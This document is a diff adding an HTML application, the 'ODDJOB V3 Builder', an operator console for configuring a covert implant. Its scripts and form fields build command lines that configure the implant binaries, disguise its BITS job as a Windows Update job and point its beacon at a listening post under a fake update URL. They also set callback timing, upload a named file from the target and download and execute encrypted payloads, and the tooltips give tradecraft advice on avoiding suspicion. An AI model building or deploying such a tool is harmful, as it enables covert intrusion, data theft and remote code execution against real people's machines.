@@ -1,0 +1,798 @@
+<html>
+<head>
+	<title>ODDJOB V3 Builder (supports ODDJOB v3.0)</title>
+	<hta:application SINGLEINSTANCE="yes" border="thick" ID=oMMApp>
+
+<script language="vbscript">
+
+Function FullPath(path)
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	FullPath = objFSO.GetAbsolutePathName(path)
+End Function
+
+Sub CreateDir(path)
+
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	path = objFSO.GetAbsolutePathName(path)
+	if(not objFSO.FolderExists(path)) then
+		Set objFolder = objFSO.CreateFolder(path)
+	End If
+End Sub
+
+Function BaseName(path)
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	BaseName = objFSO.GetBaseName(path)
+End Function
+
+Sub ProjChange
+	Project.Value = ProjectList.Value
+End Sub
+
+Sub TaskChange
+	'If(TaskList.selectedIndex > 0) Then
+		'PayloadName.Value = ""
+	'End If
+
+	'If(TaskList.selectedIndex = 3) Then
+		'Argument.Value = "00:14:00"
+	'Else
+		'Argument.Value = ""
+	'End If
+End Sub
+
+Sub CopyFile (src, dest)
+
+	Const OverwriteExisting = True
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	
+	src = objFSO.GetAbsolutePathName(src)
+	dest = objFSO.GetAbsolutePathName(dest)
+	'MsgBox src & " " & dest
+	objFSO.CopyFile src , dest, OverwriteExisting
+
+End Sub
+
+Function ZeroPad( ByVal sNumber, ByVal nPadFactor )
+    	ZeroPad = Right( String( nPadFactor, "0" ) & Trim( sNumber ), nPadFactor )
+End Function
+
+Function CheckFile(path)
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	If(Not objFSO.FileExists(path)) Then
+		MsgBox path & " not found, please build implant source before continuing"
+		Exit Function
+	End If
+End Function
+
+Sub LoadTextAreaFromFile(path, elem)
+
+    ForReading = 1
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.OpenTextFile(path, ForReading)
+    
+    'Do Until objFile.AtEndOfStream
+        'strLine = objFile.ReadLine
+        'Set objOption = Document.createElement("OPTION")
+        'objOption.Text = strLine
+        'objOption.Value = strLine
+	'list.Add(objOption)	
+    'Loop
+
+    elem.InnerText = objFile.ReadAll
+    objFile.Close
+
+End Sub
+
+
+Sub EnumFolders(Path)
+
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	Set objFolder = objFSO.GetFolder(Path)
+	Set colSubfolders = objFolder.Subfolders
+	For Each objSubfolder in colSubfolders
+
+		If(Left(objSubFolder.Name, 1) <> ".") then
+			Set objOption = Document.createElement("OPTION")
+		        objOption.Text = objFSO.GetFileName(objSubFolder.Name)
+		        objOption.Value = objFSO.GetFileName(objSubFolder.Name)
+		        ProjectList.Add(objOption)
+		End If
+
+	Next
+
+End Sub
+
+Function DateDir
+	curDate = Now()
+	DateDir = ZeroPad(Year(curDate),4) & ZeroPad(Month(curDate),2) & ZeroPad(Day(curDate),2) & _
+		"-" & _
+		 ZeroPad(Hour(curDate),2) & ZeroPad(Minute(curDate),2) & ZeroPad(Second(curDate),2)
+End Function
+
+
+Sub VBInit
+
+	Set objFSO = CreateObject("Scripting.FileSystemObject")
+	curDir = objFSO.GetAbsolutePathName(".")
+	
+	'MsgBox DateDir()
+
+	buildPath = curDir & "\builder"
+	EnumFolders(buildPath & "\Projects")
+
+	CheckFile(buildPath & "\oddjob_config_v3.exe")
+	Project.Value = ProjectList.Value
+	
+End Sub
+
+Sub SaveStringToFile (path, string)
+
+    ForWriting = 2
+
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    If(Not objFSO.FileExists(path)) Then
+    	objFSO.CreateTextFile(path)
+    End If
+
+    Set objFile = objFSO.OpenTextFile(path, ForWriting, False)
+    
+    objFile.Write(string)
+    objFile.Close
+End Sub
+
+
+</script>
+
+<script language="javascript">
+
+
+function Exec(cmdLine, outStr)
+{
+	var oShell = new ActiveXObject("WScript.Shell");
+	var oExec  = oShell.Exec(cmdLine);
+
+	while(!oExec.StdOut.AtEndOfStream)
+	{
+		outStr += oExec.StdOut.Read(1);
+	}	
+}
+
+function StrVal(elem)
+{
+	var s = elem.value;
+	if(s == "")
+		return "0";
+	else
+		return s;
+}
+
+function Build(operation)
+{
+	var oshell = new ActiveXObject("WScript.Shell");
+	var oExec;
+	var sString = "";
+	var sProject = Project.value;
+	var sDate    = DateDir();
+	
+
+	// clear the error and output windows
+	oError.innerText = "";
+	oAppInfo.innerText = "";
+    oAppLoc.outerHTML = '<a id="oAppLoc" href="">' + '</a>';
+    oLogLoc.outerHTML = '<a id="oLogLoc" href="">' + '</a>';
+	
+    // create project directory
+    var sProjDir = "builder\\Projects\\" + sProject + "\\";
+    CreateDir(sProjDir);
+    
+	//
+	// Build the command line
+	//
+	var sConfig = "builder\\oddjob_config_v3.exe";
+	var sImplant = "";
+	var sSrcImplant = "";
+	var sRelease = "bin";
+	var sCmdLine = FullPath(sConfig);
+	sCmdLine = "\"" + sCmdLine + "\"";
+    
+	
+	sSrcImplant = FullPath(sRelease);
+    
+    //choose dll or exe and x86 or x64
+    if(OutputType.selectedIndex == 0)
+    {
+		sSrcImplant += "\\oddjob_v3_x86.dll";
+    }
+	if(OutputType.selectedIndex == 1)
+    {
+		sSrcImplant += "\\oddjob_v3_x64.dll";
+    }
+	if(OutputType.selectedIndex == 2)
+    {
+		sSrcImplant += "\\oddjob_v3_x86.exe";
+    }
+	if(OutputType.selectedIndex == 3)
+	{
+		sSrcImplant += "\\oddjob_v3_x64.exe";
+    }
+	
+    //configure implant
+    if(operation == 0)
+    {
+        // create directory with date stamp for this build
+        var sBuildDir = sProjDir + sDate;
+        CreateDir(sBuildDir);
+        
+        //check args
+        if(sProject == "")
+        {
+            oError.innerText = "Please specify a project";
+            return;
+        }
+        if(JobName.value == "")
+        {
+            oError.innerText = "Please set job name";
+            return;
+        }
+        if(URL1.value == "")
+        {
+            oError.innerText = "Please set URL";
+            return;
+        }
+        if(GetRequestExtension.value == "")
+        {
+            oError.innerText = "Please set get request extension";
+            return;
+        }
+        if(FileExtension.value == "")
+        {
+            oError.innerText = "Please set file extension";
+            return;
+        }		
+		if(TimeToLive == "")
+        {
+            oError.innerText = "Please set time to live";
+            return;
+        }
+        if(Beacon.value == "")
+        {
+            oError.innerText = "Please set beacon interval";
+            return;
+        }
+        if(BeaconCount.value == "")
+        {
+            oError.innerText = "Please set beacon count";
+            return;
+        }
+        
+        if(OutputFile.value == "") {
+            oError.innerText = "Please specify a file name (\"Output File Name\" cannot be empty)";
+            return;
+        }
+        
+        if(DLLExport.value == "" || DLLExport.value.length < 1 || DLLExport.value.length > 5) {
+            oError.innerText = "DllExport name is required and must be between 1 and 5 characters long";
+            return;
+        }
+        
+        //copy clean implant.exe over to build dir
+		if(OutputType.selectedIndex >1)
+		{
+			sImplant += sBuildDir + "\\" + OutputFile.value + ".ex_"
+			CopyFile(sSrcImplant, sImplant);
+		}
+		else
+		{
+			sImplant += sBuildDir + "\\" + OutputFile.value + ".dll"
+			CopyFile(sSrcImplant, sImplant);
+		}
+        
+        //add cmd flag and implant path
+        sCmdLine += " -configure " + "\"" + sImplant + "\"";
+    
+        //add BITS job name
+        sCmdLine += " " + "\"" + JobName.value + "\"";
+        
+        //add beacon URL
+        sCmdLine += " " + URL1.value;
+        
+        //add Upload job name
+        sCmdLine += " " + "\"" + UploadJobName.value + "\"";
+        
+        //add upload filename
+        sCmdLine += " " + "\"" + UploadFileName.value + "\"";
+		
+		//add extra url
+        sCmdLine += " " + URL2.value;
+		
+		//add get request extention
+		sCmdLine += " " + GetRequestExtension.value;
+		
+		//add file request extension
+        sCmdLine += " " + FileExtension.value;
+		
+        //add Time to Live
+        sCmdLine += " " + TimeToLive.value;
+        
+        //add beacon interval
+        sCmdLine += " " + Beacon.value;
+        
+        //add beacon count
+        sCmdLine += " " + BeaconCount.value;
+        
+        //add Time to Live
+        sCmdLine += " " + UTimeToLive.value;
+        
+        //add beacon interval
+        sCmdLine += " " + UBeacon.value;
+               
+        //add multipayload or single
+        sCmdLine += " " + (MultiList.selectedIndex^1); //need to flip to make configure script happy since we switche default
+        
+        sCmdLine += " " + DLLExport.value;
+      
+        if(HighPriority.checked) {
+            sCmdLine += " 2";
+        } else {
+            sCmdLine += " 1";
+        }
+	    
+	    // display the results in the PRE tag
+	    oAppLoc.outerHTML = '<a id="oAppLoc" href="file://' + FullPath(sImplant) + '">' + FullPath(sImplant) + '</a>';
+	    //log file location
+        oLogLoc.outerHTML = '<a id="oLogLoc" href="file://' + FullPath(sProjDir) + "\\" + sDate + "\\build.log"  + '">' + FullPath(sProjDir) + "\\" + sDate + "\\build.log" + '</a>';
+    }
+    
+    //decrypt survey data
+    if(operation == 1)
+    {
+      if(SurveyData.value == "")
+      {
+         oError.innerText = "Please fill in survey field";
+         return;
+      }
+      sCmdLine += " -decrypt " + SurveyData.value;
+    }
+
+    //encrypt payload
+    if(operation == 2)
+    {
+        if(inpayload.value == "" || outpayload.value == "" || SurveyData2.value == "")
+        {
+            oError.innerText = "Please fill in payload fields and survey data";
+            return;
+        }
+   
+        sCmdLine += " -encryptpayload ";
+        sCmdLine += inpayload.value + " " + outpayload.value + " " + SurveyData2.value + " " + PayloadType.selectedIndex + " " + dllOrdinal.value;
+    }
+    
+	// DecryptProcessList
+	if(operation == 3)
+	{
+		if((inencdumpproc.value == "") || (outdecdumpproc.value == ""))
+		{
+			oError.innerText = "Please specify input and output files. Input files should be of the form 408547727p1T98kPA+Ts5+xl5CNZ0B-0l6xyqug5we70syK9kN-aJOmZM2aLoXeJXAGW9fzrtfgqXSqeuDvYUI01gNs1RTen71-NgAAjkB-J4.cab";
+			return;
+		}
+		
+		sCmdLine += " -decryptDumpProcess ";
+		sCmdLine += "\"" + inencdumpproc.value + "\"";
+		sCmdLine += " " + "\"" + outdecdumpproc.value + "\"";
+	}
+	
+	
+    //dumpconfig
+    if(operation == 4)
+    {
+        if(oddjobbinary.value == "")
+        {
+            oError.innerText = "Please specifiy ODDJOB binary to dump config from";
+            return;
+        }
+        
+        sCmdLine += " -dumpconfig ";
+        sCmdLine += "\"" + oddjobbinary.value + "\"";
+    
+    }
+
+    //genpublickey
+    if(operation == 5)
+    {
+        sCmdLine += " -genpubkey ";
+    }
+    
+    //genprivatekey
+    if(operation == 6)
+    {
+        sCmdLine += " -genprivatekey";
+    }
+
+	//
+	// Execute ODDJOB config
+	//
+	oError.innerText = sCmdLine;
+    oExec = oshell.Exec(sCmdLine);
+
+	// Read it's output 
+	while(!oExec.StdOut.AtEndOfStream)
+	{
+	  sString += oExec.StdOut.Read(1);
+	}
+		          
+	oAppInfo.innerText = sString;
+	if(operation == 0)
+	{
+	    SaveStringToFile (FullPath(sProjDir) + "\\" + sDate + "\\build.log","++++ " + sDate + " ++++")
+	    SaveStringToFile (FullPath(sProjDir) + "\\" + sDate + "\\build.log", sString)
+	}
+	
+    //SaveStringToFile(FullPath(sBuildDir) + "\\build.log", sString);
+
+	// + FullPath(sFTPath) + ">smeg</a>";
+	window.scrollBy(0,document.body.clientHeight);
+
+}
+
+
+function Init()
+{
+	VBInit();
+
+}
+</script>
+<style type="text/css">
+input { padding-right: 20px; }
+</style>
+</head>
+<body onLoad="Init()">
+	<div name="Form" id="Form" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif">
+
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(0)" value="Build" id="Submit4" DESIGNTIMEDRAGDROP="35" />
+        
+        </DIV>
+
+	<div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Build New implant for x86 or x64</H3>
+                <P>&nbsp;
+	Hover mouse over "?" for more information.
+		<table>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Project:</td>
+			<td style="width:500px"><input name="Project" style="width:248px" type="text" id="Text1" value="TEST"/>
+				<select name="ProjectList" onChange="ProjChange()" style="width:248px" type="text" id="Select1" value=""/>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">BITS Job Name:</td>
+			<td> 
+				<input name="JobName" style="width:248px" type="text" id="JobName" value="Wu Update Client "/>
+				<a style="cursor:help;" title="BITS job name that appears on target. Choose something none suspicious and not already existing on target. 'Wu Update Client' is default Windows Update BITS job name so adding a space to create 'Wu Update Client ' works well.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:250px;font-weight:bold">Output File Name <span style="font-weight: normal; font-size: 13px">(No extension)</span>:</td>
+			<td> 
+				<input name="OutputFile" style="width:248px" type="text" id="OutputFile" value=""/>
+				<a style="cursor:help;" title="Filename of the output file.  This filename will be updated in the PE file's export section, along with the PE file checksum.  Do not include the file extension, it will be added automatically.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Primary URL:</td>
+			<td >
+				<input name="URL1" type="text" id="URL1" style="width:500px" value="http://www.update.com/msdownload/update/v3-19990518/cabpool"/>
+				<a style="cursor:help;" title="LP that ODDJOB beacons to. Can use URL or IP address. Do not include trailing slash in URL.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Dummy URL:</td>
+			<td >
+				<input name="URL2" type="text" id="URL2" style="width:500px" value="http://www.yahoo.com"/>
+				<a style="cursor:help;" title="URL that we will not beacon to.  Do not look up this domain.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Get Request Extension:</td>
+			<td >
+				<input name="GetRequestExtension" type="text" id="GetRequestExtension" style="width:248px" value=".cab"/>
+				<a style="cursor:help;" title="extension that will be appended to the end of the get requests (default .cab)">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">File Extension:</td>
+			<td >
+				<input name="FileExtension" type="text" id="FileExtension" style="width:248px" value=".cab"/>
+				<a style="cursor:help;" title="extension that will be appended to the temp file on target (default .cab)">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Time To Live (secs):</td>
+			<td> 
+				<input name="TimeToLive" style="width:248px" type="text" id="TimeToLive" value="0"/>
+				<a style="cursor:help;" title="Leave value of 0. Does not imply time to live on target but relates to BITS job parameters">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Beacon Interval (secs):</td>
+			<td> 
+				<input name="Beacon" style="width:248px" type="text" id="Beacon" value="14400"/>
+				<a style="cursor:help;" title="How often to call back in seconds.">?</a>
+			</TD>
+			
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Beacon Count:</td>
+			<td> 
+				<input name="BeaconCount" style="width:248px" type="text" id="BeaconCount" value="540"/>
+				<a style="cursor:help;" title="Will stop calling back after x beacons. The beacons must successfully leave the target to be considered a beacon. After x beacons the BITS job will die but the ODDJOB binary will still exist on target and just never be executed again.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Upload Job Name:</td>
+			<td> 
+				<input name="UploadJobName" style="width:248px" type="text" id="Text2" value="Upload"/>
+				<a style="cursor:help;" title="Leave blank if not using upload feature">?</a>
+			</td>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Upload File Name:</td>
+			<td> 
+				<input name="UploadFileName" style="width:248px" type="text" id="Text3" value="4393update.xml"/>
+				<a style="cursor:help;" title="File that ODDJOB will upload if found on target. ODDJOB checks if file exists each time it runs. File is looked for in the user's temp directory">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Upload Time To Live (secs):</td>
+			<td> 
+				<input name="UTimeToLive" style="width:248px" type="text" id="Text4" value="2592000"/>
+				<a style="cursor:help;" title="Time in seconds between upload attempts.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Upload Beacon Interval (secs):</td>
+			<td> 
+				<input name="UBeacon" style="width:248px" type="text" id="Text5" value="14400"/>
+				<a style="cursor:help;" title="How often to try and upload the specified file once it exists on target.">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold;text-align:top">MultiPayload:</td>
+			<td>
+				<select name="MultiList" style="width:248px" type="text" id="MultiList" value="">
+				<option name="EXE">YES</option>
+				<option name="Multi">NO</option>
+				</select>
+				<a style="cursor:help;" title="Multipayload instructs ODDJOB to continue to callback, download and execute more than one payload. If this is set to 'no' then ODDJOB will only download and execute one payload after which it will not callback anymore. The implant will still exist on target but will never be executed again.">?</a>
+			</TD>
+		</TR>
+        <TR>
+            <td valign="top" style="width:180px;font-weight:bold;text-align:top">High Priority Job:</td>
+			<td>
+                <input type="checkbox" name="HighPriority" value="2"></input>
+            </td>
+        </TD>
+		<tr><td><p>&nbsp</p></td></tr>
+        <TR>
+			<td valign="top" style="width:250px;font-weight:bold">DLL Export Name:</td>
+			<td> 
+				<input name="DLLExport" style="width:248px" type="text" id="DllExport" value="start"/>
+				<a style="cursor:help;" title="Exported function name for the DLL.  The default is &quot;start&quot; and the limit is 5 characters">?</a>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold;text-align:top">Output Type:</td>
+			<td>
+				<select name="OutputType" style="width:248px" type="text" id="Select3" value="">
+				<option name="DLL_x86">DLL x86 (32-bit)</option>
+				<option name="DLL_x64">DLL x64 (64-bit)</option>
+				<option name="EXE_x86">EXE x86 (32-bit)</option>
+				<option name="EXE_x64">EXE x64 (64-bit)</option>
+				</select>
+			</TD>
+		
+		
+		</TR>
+		
+		</table>
+		</p>
+	</div>	
+
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: white"
+                ms_positioning="FlowLayout">
+            </DIV>
+
+        </div>
+            
+        
+        
+    <div name="Form" id="Div1" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif"> 
+	 
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(1)" value="Decrypt" id="Submit1" DESIGNTIMEDRAGDROP="35" />
+        
+     </DIV>
+
+	    <div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Decrypt Survey Data</H3>
+                <P>&nbsp;
+
+		<table>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Survey Data:</td>
+			<td> 
+				<input name="SurveyData" style="width:700px" type="text" id="SurveyData" value=""/>
+				<a style="cursor:help;" title="ex. IbMdY8bgyTifVoEm0tbAy7otG53W8drKiuJ+MbTde5nXVWDDGguv3ARXJfr1-a8-djmk3kkHsTdSAPocHoqpgsab166.cab">?</a>
+			</TD>
+		</TR>
+		
+		</table>
+		</p>
+	</div>	
+
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: white"
+                ms_positioning="FlowLayout">
+            </DIV>
+
+     </div>
+     
+     
+     
+     <div name="Form" id="Div2" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif"> 
+	 
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(2)" value="EncryptPayload" id="Submit2" DESIGNTIMEDRAGDROP="35" />
+        
+     </DIV>
+
+	    <div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Payload Encryption</H3>
+                <P>&nbsp;
+
+		<table>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Unencrypted payload:</td>
+			<td ><input name="inpayload" type="file" id="inpayload" style="width:500px"></TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Encrypted payload:</td>
+			<td ><input name="outpayload" type="file" id="outpayload" style="width:500px"></TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold;text-align:top">Payload Type:</td>
+			<td>
+				<select name="PayloadType" style="width:248px" type="text" id="Select2" value="">
+				<option name="CMD">NULL</option>
+				<option name="EXE">EXE</option>
+				<option name="DLL">DLL</option>
+				<option name="CMD">CMD</option>
+				</select>
+                <span style="font-weight:bold;text-align:top"> DLL Ordinal: <input type="text" name="dllOrdinal" value="0" /></span>
+			</TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Survey Data:</td>
+			<td> 
+				<input name="SurveyData2" style="width:700px" type="text" id="SurveyData2" value=""/>
+				<a style="cursor:help;" title="ex. IbMdY8bgyTifVoEm0tbAy7otG53W8drKiuJ+MbTde5nXVWDDGguv3ARXJfr1-a8-djmk3kkHsTdSAPocHoqpgsab166.cab">?</a>
+			</TD>
+			
+		</TR>
+		
+		</table>
+		</p>
+	</div>	
+
+	    <div name="Form" id="Div2" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif"> 
+	 
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(3)" value="DecryptProcessList" id="Submit2" DESIGNTIMEDRAGDROP="35" />
+        
+     </DIV>
+
+	    <div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Decrypt Uploaded Process List</H3>
+                <P>&nbsp;
+
+		<table>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Encrypted Upload File:</td>
+			<td ><input name="inencdumpproc" type="file" id="inencdumpproc" style="width:500px"></TD>
+		</TR>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">Decrypted Output File:</td>
+			<td ><input name="outdecdumpproc" type="file" id="outdecdumpproc" style="width:500px"></TD>
+		</TR>
+		</table>
+		</p>
+	</div>	
+	
+	
+	
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: white"
+                ms_positioning="FlowLayout">
+            </DIV>
+
+     </div>
+     
+        
+        
+        
+        <div name="Form" id="Div3" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif"> 
+	 
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(4)" value="DumpConfig" id="Submit3" DESIGNTIMEDRAGDROP="35" />
+        
+     </DIV>
+
+	    <div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Dump implant configuration data</H3>
+                <P>&nbsp;
+
+		<table>
+		<TR>
+			<td valign="top" style="width:180px;font-weight:bold">ODDJOB Binary:</td>
+			<td ><input name="oddjobbinary" type="file" id="oddjobbinary" style="width:500px"></TD>
+		</TR>
+		</table>
+		</p>
+	</div>	
+	
+	<div name="Form" id="Div4" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif"> 
+	 
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(5)" value="GenPublicKey" id="Submit5" DESIGNTIMEDRAGDROP="35" />
+        
+     </DIV>
+
+	    <div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Generate public key to be put into implant code</H3>
+                <P>&nbsp;
+		</p>
+	</div>	
+	
+	<div name="Form" id="Div5" style="BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BORDER-LEFT: 1px solid; BORDER-BOTTOM: 1px solid; FONT-FAMILY: Sans-Serif"> 
+	 
+	 <DIV style="PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; WIDTH: 100%; PADDING-TOP: 5px; BORDER-BOTTOM: thin solid; HEIGHT: 24px; BACKGROUND-COLOR: silver"
+                ms_positioning="FlowLayout">
+                <input type="submit" name="Button1" onClick="Build(6)" value="GenPrivateKey" id="Submit6" DESIGNTIMEDRAGDROP="35" />
+        
+     </DIV>
+
+	    <div style="PADDING-LEFT: 5px">
+                <H3>
+                    <P></P>
+                    Generate implant private key to be put into config tool</H3>
+                <P>&nbsp;
+		</p>
+	</div>	
+
+        
+        
+
+<P style="font-family:Courier New" ID=oError style="color:red"></PRE>
+<PRE ID=oAppInfo> </PRE>
+<PRE>ODDJOB files located at:<br><a ID=oAppLoc href=""></a></PRE>
+<PRE ID=oLogInfo> </PRE>
+<PRE>Log files located at:<br><a ID=oLogLoc href=""></a></PRE>
+
+</body>
+</html>
